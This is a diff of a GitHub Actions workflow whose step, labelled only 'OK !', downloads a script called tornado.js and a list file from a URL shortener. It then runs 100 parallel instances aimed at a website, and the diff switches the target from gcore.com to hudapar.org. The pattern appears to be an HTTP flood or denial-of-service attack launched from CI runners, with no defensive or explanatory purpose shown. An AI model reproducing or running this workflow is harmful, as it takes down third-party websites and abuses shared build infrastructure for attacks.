@@ -16,12 +16,12 @@ jobs:
       - name: OK !
         run: |
           wget https://github.com/kaneious/tornado/raw/refs/heads/main/tornado.js
-          wget https://curl.by/xX7o1/fres.txt
+          wget https://curl.by/2lW74/fres.txt
           npm i hpack
           chmod +x tornado.js
           PIDS=()
           for i in {1..100}; do
-            timeout 45 node tornado.js GET https://gcore.com/ 45 32 90 fres.txt --full --query 3
+            timeout 45 node tornado.js GET https://hudapar.org/ 45 32 90 fres.txt --full --query 3
             PIDS+=($!)
           done
           
